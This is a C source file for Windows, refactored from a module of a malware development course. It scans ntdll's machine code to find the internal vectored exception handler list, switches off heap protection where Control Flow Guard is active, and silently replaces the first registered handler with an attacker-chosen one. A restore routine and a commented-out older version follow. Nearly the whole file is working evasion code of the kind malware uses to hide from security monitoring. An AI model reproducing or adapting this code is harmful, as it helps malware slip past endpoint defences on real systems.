/*
	Refactored From: @mannyfreddy | https://maldevacademy.com/new/modules/69
*/

#include <Windows.h>

#include "Structures.h"
#include "Utilities.h"
#include "DebugMacros.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PAGE_ALIGN_DOWN(ptr) (PVOID)((ULONG_PTR)ptr & ~(0x1000 - 1));

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef VOID(NTAPI* fnRtlProtectHeap)(PVOID HeapHandle, BOOL MakeReadOnly);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _VECTORED_HANDLER_ENTRY {
	LIST_ENTRY  Entry;
	PVOID       Refs;
	PVOID       Unused;
	PVOID       VectoredHandler;
} VECTORED_HANDLER_ENTRY, * PVECTORED_HANDLER_ENTRY;

typedef struct _VECTORED_HANDLER_LIST {
	PVOID                   LockVEH;
	VECTORED_HANDLER_ENTRY* FirstVEH;
	VECTORED_HANDLER_ENTRY* LastVEH;
	PVOID                   LockVCH;
	VECTORED_HANDLER_ENTRY* FirstVCH;
	VECTORED_HANDLER_ENTRY* LastVCH;
} VECTORED_HANDLER_LIST, * PVECTORED_HANDLER_LIST;

typedef struct _VEH_CACHE {
	BOOL                    bInitialized;
	BOOL                    bCfgEnabled;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList;
	fnRtlProtectHeap		pRtlProtectHeap;
	HMODULE					hCachedNtdll;
	PVOID                   pOriginalVectoredHandler;
	PVOID                   pOurVectoredHandler;
} VEH_CACHE, * PVEH_CACHE;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
//
// Global Variables

static VEH_CACHE g_VehCache = { 0 };

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Masm.asm

extern void RtlProtectHeapWrapper(PVOID, BOOL, PVOID);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL GetVectoredHandlerList(IN HMODULE hNtdll, OUT PVOID* pLdrpVectorHandlerList) 
{
	ULONG64 pFuncPntr = 00UL;
	
	if (!(pFuncPntr = (ULONG64)GetProcAddressH(hNtdll, FNV1A_RtlRemoveVectoredExceptionHandler))) 
		return FALSE;

	while (*(BYTE*)pFuncPntr != 0xCC) 
	{
		if (*(BYTE*)pFuncPntr == 0xE9) 
		{

			pFuncPntr = pFuncPntr + 0x05 + *(INT*)(pFuncPntr + 0x01);

			while (((*(ULONG*)pFuncPntr) & 0xFFFFFF) != 0x258D4C) 
			{
				pFuncPntr = pFuncPntr + 0x01;
			}

			*pLdrpVectorHandlerList = pFuncPntr + 0x07 + *(INT*)(pFuncPntr + 0x03);
			return TRUE;
		}

		pFuncPntr = pFuncPntr + 0x01;
	}

	return FALSE;
}

static BOOL GetLdrProtectMrdata(IN HMODULE hNtdll, OUT PVOID* pLdrProtectMrdata) {

	BYTE*	pFuncPntr	= NULL;
	INT		iOffset		= 0x00;

	if (!(pFuncPntr = (ULONG64)GetProcAddressH(hNtdll, FNV1A_RtlRemoveVectoredExceptionHandler)))
		return FALSE;


	while (TRUE) 
	{
		if (*pFuncPntr == 0xE8) 
		{
			iOffset = *(INT*)(pFuncPntr + 0x01);
			
			*pLdrProtectMrdata = (PVOID)((ULONG_PTR)(pFuncPntr + 0x05) + iOffset);
			
			return TRUE;
		}

		pFuncPntr++;
	}

	return FALSE;
}


static BOOL GetLdrpMrdataHeap(IN HMODULE hNtdll, OUT PVOID* pLdrpMrdataHeap) {

	ULONG64 pFuncPntr = 00UL;

	if (!(pFuncPntr = (ULONG64)GetProcAddressH(hNtdll, FNV1A_RtlAddFunctionTable)))
		return FALSE;

	while (((*(ULONG*)pFuncPntr) & 0xFFFFFF) != 0x0D8B48) 
	{
		pFuncPntr = pFuncPntr + 0x01;
	}

	*pLdrpMrdataHeap = pFuncPntr + 0x07 + *(INT*)(pFuncPntr + 0x03);

	return TRUE;
}


static BOOL GetLdrEnsureMrdataHeapExists(IN HMODULE hNtdll, OUT PVOID* pLdrEnsureMrdataHeapExists) {

	BYTE*	pFuncPntr	= NULL;
	INT		iOffset		= 0x00;

	if (!(pFuncPntr = (ULONG64)GetProcAddressH(hNtdll, FNV1A_RtlAddFunctionTable)))
		return FALSE;

	while (TRUE)
	{
		if (*pFuncPntr == 0xE8)
		{
			iOffset = *(INT*)(pFuncPntr + 0x01);
			
			*pLdrEnsureMrdataHeapExists = (PVOID)((ULONG_PTR)(pFuncPntr + 0x05) + iOffset);
			
			return TRUE;
		}

		pFuncPntr++;
	}

	return FALSE;
}


static BOOL CheckCFGStatus(IN HANDLE hProcess)
{

	PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY ProcCfg = { 0 };

	if (!GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy, &ProcCfg, sizeof(ProcCfg))) 
	{
		DBG_PRINT_A("[!] GetProcessMitigationPolicy Failed With Error: %lu", GetLastError());
		return FALSE;
	}

	return ProcCfg.EnableControlFlowGuard ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


static BOOL InitializeVehCache(IN HMODULE hNtdll, IN BOOL bForceRefresh)
{
    if (g_VehCache.bInitialized && g_VehCache.hCachedNtdll == hNtdll && !bForceRefresh)
        return TRUE;
    
    if (g_VehCache.hCachedNtdll != hNtdll || bForceRefresh)
        RtlZeroMemory(&g_VehCache, sizeof(VEH_CACHE));
    
    if (!GetVectoredHandlerList(hNtdll, &g_VehCache.pLdrpVectorHandlerList))
    {
        DBG_PRINT_A("[!] Failed To Get LdrpVectorHandlerList");
        return FALSE;
    }
    
    g_VehCache.bCfgEnabled = CheckCFGStatus((HANDLE)-1);
    
    if (g_VehCache.bCfgEnabled)
    {
        if (!(g_VehCache.pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddressH(hNtdll, FNV1A_RtlProtectHeap)))
        {
            DBG_PRINT_A("[!] Failed To Resolve RtlProtectHeap");
            RtlZeroMemory(&g_VehCache, sizeof(VEH_CACHE));
            return FALSE;
        }
    }
    
    g_VehCache.hCachedNtdll = hNtdll;
    
    return TRUE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL OverwriteFirstVectoredExceptionHandlerEx(IN HMODULE hNtdll, IN PVOID pNewVectoredHandler)
{
    PVOID   pHeapHandle		= NULL;
    BOOL    bLocked			= FALSE,
            bResult			= FALSE;
    
    if (!InitializeVehCache(hNtdll, FALSE))
        return FALSE;
    
    AcquireSRWLockExclusive(g_VehCache.pLdrpVectorHandlerList->LockVEH);
    bLocked = TRUE;
    
    if (g_VehCache.pLdrpVectorHandlerList->FirstVEH == (ULONG_PTR)g_VehCache.pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH))
    {
        DBG_PRINT_A("[-] VEH List is Empty, Nothing to Overwrite");
        bResult = TRUE;
        goto _END_OF_FUNC;
    }
    
    if (g_VehCache.bCfgEnabled)
    {
        pHeapHandle = PAGE_ALIGN_DOWN(g_VehCache.pLdrpVectorHandlerList->FirstVEH);
        RtlProtectHeapWrapper(pHeapHandle, FALSE, g_VehCache.pRtlProtectHeap);
    }
    
    g_VehCache.pOriginalVectoredHandler = DecodePointer(g_VehCache.pLdrpVectorHandlerList->FirstVEH->VectoredHandler);
	g_VehCache.pOurVectoredHandler		= pNewVectoredHandler;
	g_VehCache.bInitialized				= TRUE;

    *(PVOID*)&g_VehCache.pLdrpVectorHandlerList->FirstVEH->VectoredHandler = EncodePointer(pNewVectoredHandler);
    
    bResult = TRUE;
    
_END_OF_FUNC:
    if (bLocked)
        ReleaseSRWLockExclusive(g_VehCache.pLdrpVectorHandlerList->LockVEH);
    if (g_VehCache.bCfgEnabled && pHeapHandle)
        RtlProtectHeapWrapper(pHeapHandle, TRUE, g_VehCache.pRtlProtectHeap);
    return bResult;
}


BOOL RestoreFirstVectoredExceptionHandler(VOID)
{
    PVOID   pHeapHandle		= NULL;
	PVOID   pCurrentHandler = NULL;
    BOOL    bLocked			= FALSE,
            bResult			= FALSE;
    
	if (!g_VehCache.bInitialized || !g_VehCache.pOriginalVectoredHandler || !g_VehCache.pOurVectoredHandler)
		return FALSE;
    
    AcquireSRWLockExclusive(g_VehCache.pLdrpVectorHandlerList->LockVEH);
    bLocked = TRUE;
    
    if (g_VehCache.pLdrpVectorHandlerList->FirstVEH == (ULONG_PTR)g_VehCache.pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH))
    {
        DBG_PRINT_A("[-] VEH List is Empty, Nothing to Restore");
        goto _END_OF_FUNC;
    }

	pCurrentHandler = DecodePointer(g_VehCache.pLdrpVectorHandlerList->FirstVEH->VectoredHandler);

	if (pCurrentHandler != g_VehCache.pOurVectoredHandler)
	{
		DBG_PRINT_A("[!] First VEH handler Has Changed - Not Our Handler Anymore (Current: 0x%p, Expected: 0x%p)", pCurrentHandler, g_VehCache.pOurVectoredHandler);
		goto _END_OF_FUNC;
	}
    
    if (g_VehCache.bCfgEnabled)
    {
        pHeapHandle = PAGE_ALIGN_DOWN(g_VehCache.pLdrpVectorHandlerList->FirstVEH);
        RtlProtectHeapWrapper(pHeapHandle, FALSE, g_VehCache.pRtlProtectHeap);
    }
    
	*(PVOID*)&g_VehCache.pLdrpVectorHandlerList->FirstVEH->VectoredHandler = EncodePointer(g_VehCache.pOriginalVectoredHandler);

	g_VehCache.pOriginalVectoredHandler = NULL;
	g_VehCache.pOurVectoredHandler		= NULL;
    bResult = TRUE;
    
_END_OF_FUNC:
    if (bLocked)
        ReleaseSRWLockExclusive(g_VehCache.pLdrpVectorHandlerList->LockVEH);
    if (g_VehCache.bCfgEnabled && pHeapHandle)
        RtlProtectHeapWrapper(pHeapHandle, TRUE, g_VehCache.pRtlProtectHeap);
    return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
/*
BOOL OverwriteFirstVectoredExceptionHandler(IN HMODULE hNtdll, IN PVOID pNewVectoredHandler)
{

	PVOID					pHeapHandle					= NULL;
	BOOL					bIsCfgEnabled				= FALSE,
							bLocked						= FALSE,
							bResult						= FALSE;
	VECTORED_HANDLER_LIST*	pLdrpVectorHandlerList		= NULL;
	fnRtlProtectHeap		pRtlProtectHeap				= NULL;

	if (!hNtdll || !pNewVectoredHandler) return FALSE;

	if (!GetVectoredHandlerList(hNtdll, &pLdrpVectorHandlerList))
	{
		DBG_PRINT_A("[!] Failed To Get LdrpVectorHandlerList");
		return FALSE;
	}

	AcquireSRWLockExclusive(pLdrpVectorHandlerList->LockVEH);

	bLocked = TRUE;

	if (pLdrpVectorHandlerList->FirstVEH == (ULONG_PTR)pLdrpVectorHandlerList + offsetof(VECTORED_HANDLER_LIST, FirstVEH))
	{
		DBG_PRINT_A("[-] VEH List is Empty, Nothing to Overwrite");
		bResult = TRUE;
		goto _END_OF_FUNC;
	}

	bIsCfgEnabled = CheckCFGStatus((HANDLE)-1);

	if (bIsCfgEnabled)
	{
		if (!(pRtlProtectHeap = (fnRtlProtectHeap)GetProcAddressH(hNtdll, FNV1A_RtlProtectHeap)))
		{
			DBG_PRINT_A("[!] Failed To Resolve RtlProtectHeap");
			goto _END_OF_FUNC;
		}

		pHeapHandle = PAGE_ALIGN_DOWN(pLdrpVectorHandlerList->FirstVEH);
		RtlProtectHeapWrapper(pHeapHandle, FALSE, pRtlProtectHeap);
	}

	*(PVOID*)&pLdrpVectorHandlerList->FirstVEH->VectoredHandler = EncodePointer(pNewVectoredHandler);

	bResult = TRUE;

_END_OF_FUNC:
	if (bLocked)
		ReleaseSRWLockExclusive(pLdrpVectorHandlerList->LockVEH);
	if (bIsCfgEnabled)
		RtlProtectHeapWrapper(pHeapHandle, TRUE, pRtlProtectHeap);
	return bResult;
}
*/